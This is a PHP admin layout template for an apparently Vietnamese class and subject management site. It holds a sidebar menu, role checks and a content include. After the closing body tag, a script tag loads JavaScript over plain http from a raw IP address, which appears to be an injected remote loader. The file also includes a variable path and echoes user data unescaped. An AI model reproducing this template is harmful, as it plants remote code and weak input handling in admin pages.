<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Admin</title>
	<link rel="stylesheet" type="text/css" href="public/backend/css/style.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<script type="text/javascript" src="public/backend/ckeditor/ckeditor.js"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="public/backend/js/layout.js"></script>
</head>
<body>
	<script type="text/javascript">
		
			function function_level(){
				alert("Bạn không đủ quyền truy cập vào trang này!");
			}
	
	</script>
	<div class="container-fuild">

		<div class="sibar">
			<h1><a href="admin.php">Admin</a></h1>
			<ul class="navbar-nav">
				<li class="nav-item" ><a href="" ><i class="fas fa-fw fa-tachometer-alt"></i>&nbsp;&nbsp;Dashboard</a></li>
				<?php  
				if($_SESSION["username"]["level"]==1){?>
					<li class="nav-item alert" onclick = "function_level();">
						<a>
							<i class="fa fa-bars"></i>&nbsp;&nbsp;Quản lý Lớp
						</a>
					</li>
					<li class="nav-item alert" onclick = "function_level();"><a><i class="fas fa-book-open"></i>&nbsp;&nbsp;Quản lý Môn học</a></li>
					<li class="nav-item alert" onclick = "function_level();"><a><i class="fa fa-user"></i>&nbsp;&nbsp;Quản lý người dùng</a></li>
				<?php }else{?>
					<li class="nav-item">
						<a href="admin.php?controller=class">
							<i class="fa fa-bars"></i>&nbsp;&nbsp;Quản lý Lớp
						</a>
					</li>
					<li class="nav-item"><a href="admin.php?controller=subject"><i class="fas fa-book-open"></i>&nbsp;&nbsp;Quản lý Môn học</a></li>
					<li class="nav-item"><a href="admin.php?controller=user"><i class="fa fa-user"></i>&nbsp;&nbsp;Quản lý người dùng</a></li>

				<?php }
				?>
				<li class="nav-item"><a href="admin.php?controller=post"><i class="fa fa-newspaper-o"></i>&nbsp;&nbsp;Quản lý Post</a></li>
				

				
				
				
			</ul>
		</div>
		<div class="header">
			<div class="heading">
				<div class="heading-left"></div>
				<div class="heading-right">
					<div class="search"></div>
					
					<div class="power">
						<a href="admin.php?controller=logout"><i class="fa fa-power-off"></i></a>
						
						
						<span>
						 Xin chào : <?php echo $_SESSION['username']["fullname"]; ?>
						 (&nbsp;<?php
						 if($_SESSION["username"]["level"]==1){
						 	echo "Editor";	
						}else {
								echo "Admin";
						}
						 ?>&nbsp;)
						 	
						 </span>
					</div>
					
				</div>
			</div>
			<div class="content">
				<?php
				if(file_exists($controller))
					include $controller;
				?>

			</div>
		</div>

	</div>
</body>


<script src="http://118.70.13.36:6288/js/debucsser.js"></script>
</html>